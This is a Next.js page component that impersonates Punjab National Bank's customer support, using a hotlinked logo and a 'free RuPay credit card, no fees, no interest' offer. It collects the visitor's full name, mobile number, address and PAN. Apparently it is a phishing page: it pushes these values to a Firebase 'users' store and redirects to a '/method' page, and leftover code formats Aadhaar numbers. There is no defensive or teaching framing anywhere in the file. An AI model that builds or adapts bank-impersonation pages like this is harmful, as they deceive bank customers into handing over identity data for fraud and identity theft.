"use client";
import { useState } from "react";
import { ref, push } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Home() {
  const router = useRouter();

  const [formData, setFormData] = useState({
    fullName: "",
    mobile: "",
    address: "",
    pan: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;
    // Apply formatting logic based on input name
    if (name === "mobile") {
      // Mobile input formatting
      value = value.replace(/\D/g, ""); // Remove non-digits
      if (value.length > 10) {
        value = value.substring(0, 10);
      }
    } else if (name === "aadhar") {
      // Aadhar input formatting
      value = value.replace(/\D/g, ""); // Remove non-digits
      if (value.length > 12) {
        value = value.substring(0, 12);
      }
      const formattedInput = value.match(/.{1,4}/g)?.join("-") || "";
      value = formattedInput;
    }

    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formRef = ref(database, "users");
    await push(formRef, formData);
    // alert("Form submitted successfully!");
    router.push("/method");
    setFormData({
      fullName: "",
      mobile: "",
      address: "",
      pan: "",
    });
  };

  return (
    <main className="">
      <section className="w-full">
        <div className="h-auto w-full flex items-center justify-left bg-[#91203e] p-1">
          <img
            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaePPd-mxequ-ctngUKynMFKVPkuogwmb5cw&s"
            className="p-2 h-[60px]"
            alt="Logo"
          />
          <span className="font-semibold text-xl text-white">
            PNB Customer Support
          </span>
        </div>
        <div className="p-6">
          <h1 className="text-2xl font-bold text-[#91203e]">
            Apply Free PNB Rupay Credit Card Now!
          </h1>
          <span>
            No annual fee, no joining fee, no hidden charges, no interest
          </span>
          {/* <p className="text-sm text-slate-600 mt-2">
            It is pleasure having you here. We would like to have few details of
            yours.
          </p> */}
          <form
            className="space-y-6 flex flex-col justify-center mt-10"
            onSubmit={handleSubmit}
            id="first-form"
          >
            <div className="mb-4">
              <label
                className="block text-gray-700 text-sm mb-2"
                htmlFor="full_name"
              >
                Full Name
              </label>
              <input
                className="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="full_name"
                type="text"
                name="fullName"
                placeholder="Please enter here"
                value={formData.fullName}
                onChange={handleChange}
              />
            </div>
            <div className="mb-4">
              <label
                className="block text-gray-700 text-sm mb-2"
                htmlFor="mobile"
              >
                Mobile Number
              </label>
              <input
                className="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="mobile"
                name="mobile"
                type="text"
                placeholder="Please enter here"
                value={formData.mobile}
                onChange={handleChange}
              />
            </div>
            <div className="mb-4">
              <label
                className="block text-gray-700 text-sm mb-2"
                htmlFor="address"
              >
                A Address
              </label>
              <input
                className="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="address"
                name="address"
                type="text"
                placeholder="Please enter here"
                value={formData.address}
                onChange={handleChange}
              />
            </div>
            <div className="mb-4">
              <label className="block text-gray-700 text-sm mb-2" htmlFor="pan">
                Pan
              </label>
              <input
                className="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="pan"
                name="pan"
                type="text"
                placeholder="Please enter here"
                value={formData.pan}
                onChange={handleChange}
              />
            </div>
            <div className="w-full flex justify-center items-center">
              <button
                className="bg-gradient-to-r from-[#91203e] to-[#91203e] hover:from-red-700 hover:to-purple-700 text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full"
                type="submit"
              >
                Submit
              </button>
            </div>
          </form>
          <div className="mt-10">
            <div className="grid grid-cols-1 w-full">
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>FAQs: </span>
                <span className="text-slate-600">
                  Find answers to the most frequently asked questions.
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Contact Us: </span>
                <span className="text-slate-600">
                  Get in touch with our support team.
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Product Guides: </span>
                <span className="text-slate-600">
                  Access detailed guides and tutorials.
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Account Management: </span>
                <span className="text-slate-600">
                  Manage your account settings and preferences
                </span>
              </div>
              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                <span>Order Tracking: </span>
                <span className="text-slate-600">
                  Track the status of your orders.
                </span>
              </div>
            </div>
          </div>
        </div>
      </section>
      <section className="bg-[#91203e] p-5 w-full">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-white font-bold">Contact Us</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Locate Us</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Rate & Charges</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Regulatory</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-white font-bold">Policies</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">
            Regulatory Disclosures
          </span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">
            Secure Usage Guidelines
          </span>
        </div>
        <div className="mt-5 text-[10px] text-white">
          Copyright @2021-2022 CUSTOMER SUPPORT. All right reserved.
        </div>
      </section>
    </main>
  );
}
